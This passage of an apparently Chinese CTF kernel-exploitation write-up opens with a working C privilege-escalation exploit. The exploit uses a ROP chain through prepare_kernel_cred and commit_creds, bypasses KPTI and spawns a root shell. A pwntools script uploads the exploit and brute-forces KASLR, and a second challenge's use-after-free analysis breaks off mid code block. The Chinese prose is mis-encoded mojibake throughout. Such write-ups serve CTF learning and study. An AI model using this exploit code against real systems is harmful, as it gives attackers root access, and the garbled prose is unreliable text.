class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81090c20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810909b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81001619</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RET 0xffffffff81b66d10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff8102984b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *buf;</span><br><span class="line">    <span class="type">size_t</span>  *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">int</span>     i;</span><br><span class="line">    <span class="type">int</span>     chal_fd;</span><br><span class="line">    <span class="type">size_t</span>  offset;</span><br><span class="line"></span><br><span class="line">    offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line">    saveStatus();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = (<span class="type">size_t</span>*)(buf + <span class="number">0x102</span>);</span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// padding</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// rbp</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = POP_RDI_RET + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = COMMIT_CREDS + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_cs;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_rflags;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_sp;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_ss;</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">short</span> *)(buf))[<span class="number">0</span>] = <span class="number">0x112</span> + i * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    chal_fd = open(<span class="string">&quot;/proc/chal&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(chal_fd, <span class="number">0x666</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œ ROP é“¾å¸ƒå±€ä¸­ <code>prepare_kernel_cred</code> åç›´æ¥å°±åˆ° <code>commit_creds</code> æ˜¯å› ä¸ºç»è¿‡ç¬”è€…è°ƒè¯•å‘ç°åœ¨æ‰§è¡Œå®Œ <code>prepare_kernel_cred</code> åæ­¤æ—¶çš„ rax ä¸ rdi éƒ½æŒ‡å‘ root credï¼Œå› æ­¤ä¸éœ€è¦å† <code>mov rdi, rax</code></p><p><img src="https://i.loli.net/2021/10/28/Tud1Lb8SkrXycxt.png"></p></blockquote><p>æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/28/pBTRsQiA9HdaX16.png" alt="image.png"></p><p>åæ­£ç¬”è€…åœ¨æœ¬åœ°æ²¡æ‰“é€šè¿‡ï¼Œ<del>å±äºæ˜¯å±‘é¢˜</del></p><blockquote><p>ç¬”è€…åŸæœ¬ä»¥ä¸º<strong>ä¼šæœ‰ä¸€ç§ç‰¹åˆ«é«˜ç«¯ç‰¹åˆ« NB çš„æ–¹æ³•æ¥ç»•è¿‡ KASLRï¼Œå®ç° Kernel BROP</strong>ï¼Œåé¢å‘ç°<strong>çº¯ç²¹å°±æ‹¼è„¸</strong>ï¼Œè„¸å¥½å°±èƒ½æ‹¿åˆ°flag</p></blockquote><blockquote><p>r3kapig çš„ wp ä¸Šè¿˜å±•ç¤ºäº†ä¸€ä¸ªâ€œå°æŠ€å·§â€ï¼šä¼—æ‰€å‘¨çŸ¥åœ¨å¼€å¯ KPTI çš„æƒ…å†µä¸‹ç›´æ¥è¿”å›ç”¨æˆ·æ€ä¼š segmentation faultï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥<strong>æŠŠåŸæ¥çš„è¿”å›åœ°å€ getRootShell å‡½æ•°è®¾ä¸º SIGSEGV ä¿¡å·çš„å¤„ç†å‡½æ•°</strong>ï¼Œè¿™æ ·åŸå…ˆçš„ <code>swapgs ; iretq</code> çš„æ–¹æ³•å°±å¯ä»¥ç»§ç»­ç”¨äº†</p><p><del>é‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨  swapgs_restore_regs_and_return_to_usermode å‘¢</del></p></blockquote><h1 id="0x02-kernote"><a href="#0x02-kernote" class="headerlink" title="0x02.kernote"></a>0x02.kernote</h1><h2 id="ä¸€ã€é¢˜ç›®åˆ†æ-1"><a href="#ä¸€ã€é¢˜ç›®åˆ†æ-1" class="headerlink" title="ä¸€ã€é¢˜ç›®åˆ†æ"></a>ä¸€ã€é¢˜ç›®åˆ†æ</h2><p>è¿™ä¸€é¢˜çš„é¢˜è§£ç¬”è€…ä¸»è¦è¿˜æ˜¯å‚ç…§ç€å®˜æ–¹çš„é¢˜è§£æ¥å†™çš„ï¼Œæ˜¯æœ¬åœºæ¯”èµ›ä¸­ç»™ç¬”è€…å¸¦æ¥æ”¶è·æœ€å¤§çš„ä¸€é“ kernel pwn é¢˜</p><h3 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h3><p>ä¸ä¸€èˆ¬çš„ kernel pwn é¢˜ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€æ¬¡ç»™å‡ºçš„æ–‡ä»¶ç³»ç»Ÿä¸æ˜¯ç®€é™‹çš„ ramfs è€Œæ˜¯å¸¸è§„çš„ ext4 é•œåƒæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>mount</code> å‘½ä»¤å°†å…¶æŒ‚è½½ä»¥æŸ¥çœ‹å¹¶ä¿®æ”¹å…¶å†…å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount rootfs.img /mnt/temp</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/26/iRaDAoUKVOeQ1r7.png" alt="image.png"></p><p>æœ¬åœ°è°ƒè¯•æ—¶ç›´æ¥å°†æ–‡ä»¶å¤åˆ¶åˆ°æŒ‚è½½ç‚¹ä¸‹å³å¯ï¼Œåœ¨ <code>umount</code> ä¹‹åä¿®æ”¹ä¼šè‡ªåŠ¨ç”Ÿæ•ˆ</p><h3 id="ä¿æŠ¤-1"><a href="#ä¿æŠ¤-1" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h3><p>æˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹é¢˜ç›®æä¾›çš„ <code>README.md</code>ï¼š</p><blockquote><p>Here are some kernel config options in case you need it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯å‡ºé¢˜äººåœ¨ç¼–è¯‘å†…æ ¸æ—¶å¹¶æ²¡æœ‰é€‰æ‹©é»˜è®¤çš„ slub åˆ†é…å™¨ï¼Œè€Œæ˜¯é€‰æ‹©äº† <code>slab</code> åˆ†é…å™¨ï¼Œåç»­æˆ‘ä»¬è§£é¢˜çš„è¿‡ç¨‹ä¹Ÿä¸ slab çš„ç‰¹å¾æœ‰å…³</p><ul><li>å¼€å¯äº† Random Freelistï¼ˆslab çš„ freelist ä¼šè¿›è¡Œä¸€å®šçš„éšæœºåŒ–ï¼‰</li><li>å¼€å¯äº† Hardened Freelistï¼ˆslab çš„ freelist ä¸­çš„ object çš„ next æŒ‡é’ˆä¼šä¸ä¸€ä¸ª cookie è¿›è¡Œå¼‚æˆ–ï¼ˆå‚ç…§ glibc çš„ safe-linkingï¼‰ï¼‰</li><li>å¼€å¯äº† Hardened Usercopyï¼ˆåœ¨å‘å†…æ ¸æ‹·è´æ•°æ®æ—¶ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥<strong>åœ°å€æ˜¯å¦å­˜åœ¨ã€æ˜¯å¦åœ¨å †æ ˆä¸­ã€æ˜¯å¦ä¸º slab ä¸­ objectã€æ˜¯å¦éå†…æ ¸ .text æ®µå†…åœ°å€ç­‰ç­‰</strong>ï¼‰</li><li>å¼€å¯äº† Static Usermodehelper Pathï¼ˆmodprobe_path ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹ï¼‰</li></ul><p>æ¥ä¸‹æ¥åˆ†æå¯åŠ¨è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><ul><li>å¼€å¯äº† SMAP &amp; SMEPï¼ˆç”¨æˆ·ç©ºé—´æ•°æ®è®¿é—®ï¼ˆaccessï¼‰ã€æ‰§è¡Œï¼ˆexecuteï¼‰ä¿æŠ¤ï¼‰</li><li>å¼€å¯äº† KASLRï¼ˆå†…æ ¸åœ°å€ç©ºé—´éšæœºåŒ–ï¼‰</li><li>å¼€å¯äº† KPTIï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰</li></ul><h3 id="é€†å‘åˆ†æ-1"><a href="#é€†å‘åˆ†æ-1" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªå†…æ ¸æ¨¡å— <code>kernote.ko</code>ï¼ŒæŒ‰æƒ¯ä¾‹è¿™ä¾¿æ˜¯å­˜åœ¨æ¼æ´çš„å†…æ ¸æ¨¡å—</p><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œä¸èƒ½çœ‹å‡ºæ˜¯å¸¸è§çš„å†…æ ¸èœå•å †å½¢å¼ï¼Œåªå®šä¹‰äº† ioctlä¸”åŠ äº†ğŸ”’</p><h4 id="0x6667-åˆ†é…-object"><a href="#0x6667-åˆ†é…-object" class="headerlink" title="0x6667. åˆ†é… object"></a>0x6667. åˆ†é… object</h4><p>0x6667 åŠŸèƒ½å¯ä»¥åˆ†é… objectï¼Œåœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„ buf ç”¨ä»¥å­˜æ”¾ object æŒ‡é’ˆï¼Œæˆ‘ä»¬æœ€å¤šå¯ä»¥åŒæ—¶å­˜æ”¾ 0xF ä¸ª object æŒ‡é’ˆï¼Œè€Œåˆ†é…çš„å¤§å°é™å®šä¸º 0x8</p><p><img src="https://i.loli.net/2021/10/27/rMzk1F8OsVdXeZW.png" alt="image.png"></p><p>åœ¨è¿™é‡Œæœ‰ä¸€ä¸ª slab ä¸ slub ç›¸ä¸åŒçš„ç‚¹ï¼šå¯¹äºä»¥å¾€çš„ slub åˆ†é…å™¨è€Œè¨€ï¼Œè‹¥æ˜¯æˆ‘ä»¬ kmalloc(8) åˆ™é€šå¸¸ä¼šä» <code>kmalloc-8</code> ä¸­å–å¤§å°ä¸º 8 çš„ objectï¼›ä½†æ˜¯åœ¨ slab æºç ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><blockquote><p>å†…æ ¸æºç ç‰ˆæœ¬5.11ï¼Œinclude&#x2F;linux&#x2F;slab.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>å³ slab åˆ†é…å™¨åˆ†é…çš„ object çš„å¤§å°<strong>æœ€å°ä¸º 32</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”å½“æ˜¯ä» <code>kmalloc-32</code> ä¸­å– object</p><blockquote><p>é˜…è¯»æºç æˆ‘ä»¬å¯ä»¥å‘ç° slab ä¸º 32ï¼Œ è€Œ slob å’Œ slub éƒ½æ˜¯ 8</p></blockquote><h4 id="0x6666-ä¿å­˜-object-æŒ‡é’ˆåˆ°å…¨å±€å˜é‡-note"><a href="#0x6666-ä¿å­˜-object-æŒ‡é’ˆåˆ°å…¨å±€å˜é‡-note" class="headerlink" title="0x6666. ä¿å­˜ object æŒ‡é’ˆåˆ°å…¨å±€å˜é‡ note"></a>0x6666. ä¿å­˜ object æŒ‡é’ˆåˆ°å…¨å±€å˜é‡ note</h4><p>è¿™ä¸ªåŠŸèƒ½å°† buf æ•°ç»„ä¸­æŒ‡å®š object æŒ‡é’ˆå­˜æ”¾åˆ°å…¨å±€å˜é‡ note ä¸­ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°è¿™é‡Œ<strong>å¯èƒ½ä¼šæœ‰ UAF</strong>ï¼Œåç»­åˆ†ææˆ‘ä»¬å¯ä»¥å‘ç°ç¡®å®å¦‚æ­¤</p><p><img src="https://i.loli.net/2021/10/27/NudsLpgC7yZE45h.png" alt="image.png"></p><h4 id="0x6668-é‡Šæ”¾æŒ‡å®š-object"><a href="#0x6668-é‡Šæ”¾æŒ‡å®š-object" class="headerlink" title="0x6668. é‡Šæ”¾æŒ‡å®š object"></a>0x6668. é‡Šæ”¾æŒ‡å®š object</h4><p>æ¯”è¾ƒçº¯ç²¹çš„ free åŠŸèƒ½ï¼Œæ³¨æ„åˆ°è¿™é‡Œæ˜¯é‡Šæ”¾çš„ buf æ•°ç»„å†… object åæ¸…ç©ºï¼Œ<strong>ä½†æ˜¯æ²¡æœ‰æ¸…ç©º note æ•°ç»„</strong>ï¼Œä¸€ä¸ª UAF å·²ç»å‘¼ä¹‹æ¬²å‡ºäº†</p><p><img src="https://i.loli.net/2021/10/27/kPEM6tCymF1HiO5.png" alt="image.png"></p><h4 id="0x6669-å‘-note-æŒ‡å‘-object-å†…å†™å…¥-8-å­—èŠ‚"><a href="#0x6669-å‘-note-æŒ‡å‘-object-å†…å†™å…¥-8-å­—èŠ‚" class="headerlink" title="0x6669. å‘ note æŒ‡å‘ object å†…å†™å…¥ 8 å­—èŠ‚"></a>0x6669. å‘ note æŒ‡å‘ object å†…å†™å…¥ 8 å­—èŠ‚</h4><p>UAF å·²ç»è´´è„¸äº†ï¼ˆï¼‰</p><p><img src="https://i.loli.net/2021/10/27/rFMhKICwqvjlemY.png" alt="image.png"></p><h4 id="0x666A-æ‰“å°-note-æ‰€å­˜-object-åœ°å€ï¼ˆæ— æ•ˆåŠŸèƒ½ï¼‰"><a href="#0x666A-æ‰“å°-note-æ‰€å­˜-object-åœ°å€ï¼ˆæ— æ•ˆåŠŸèƒ½ï¼‰" class="headerlink" title="0x666A. æ‰“å° note æ‰€å­˜ object åœ°å€ï¼ˆæ— æ•ˆåŠŸèƒ½ï¼‰"></a>0x666A. æ‰“å° note æ‰€å­˜ object åœ°å€ï¼ˆæ— æ•ˆåŠŸèƒ½ï¼‰</h4><p>æ¯”èµ›çš„æ—¶å€™åˆ†æå¾—æ¯”è¾ƒç—›è‹¦çš„ä¸€ä¸ªåŠŸèƒ½â€¦èµ›åå‡ºé¢˜äººè¯´è¿™ä¸ªåŠŸèƒ½å†™æ¥ç©çš„ï¼ˆğŸ”¨ï¼‰</p><p>ä¸€å¼€å§‹é¦–å…ˆä»ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹å–äº†ä¸€ä¸ªå€¼ï¼Œ<del>è™½ç„¶èµ›åçœ‹å‡ºé¢˜äººå†™çš„æºä»£ç ä¸æ˜¯è¿™ä¸ªæ ·å­ï¼Œä½†ä¼—æ‰€å‘¨çŸ¥å†…æ ¸çš„å¾ˆå¤šå®å±•å¼€åŠå¤šå±‚ç»“æ„ä½“å¥—å¨ƒç»™é€†å‘å·¥ä½œå¸¦æ¥æå¤§å›°éš¾</del></p><p><img src="https://i.loli.net/2021/10/27/DT9OfQBsFG2iHtE.png" alt="image.png"></p><p>ç¬”è€…åœ¨æ¯”èµ›æœŸé—´çŒœæµ‹åº”å½“æ˜¯ <code>current_task-&gt;cred</code> ä¸­æŸä¸ªå€¼ï¼Œåé¢æ‰¾äº†å¯¹åº”å†…æ ¸ç‰ˆæœ¬æºç è‡ªå·±å†™äº†ä¸ªå†…æ ¸æ¨¡å—ççŒœåç§»ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯<code>current_task-&gt;cred-&gt;user-&gt;__count</code></p><p>å‰é¢è¿™ä¸€æ®µä»£ç é¦–å…ˆç»™ <code>current_task-&gt;cred-&gt;user</code> çš„å¼•ç”¨è®¡æ•°å™¨ <code>__count</code> æˆå‘˜ + 1ï¼Œå¯¹åº”å†…æ ¸å‡½æ•° <code>refcount_inc()</code> ï¼Œå¤šå±‚å¥—å¨ƒè°ƒç”¨å±•å¼€åå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __refcount_add(<span class="type">int</span> i, <span class="type">refcount_t</span> *r, <span class="type">int</span> *oldp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> old = atomic_fetch_add_relaxed(i, &amp;r-&gt;refs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldp)</span><br><span class="line">        *oldp = old;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!old))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_UAF);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(old &lt; <span class="number">0</span> || old + i &lt; <span class="number">0</span>))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_OVF);</span><br><span 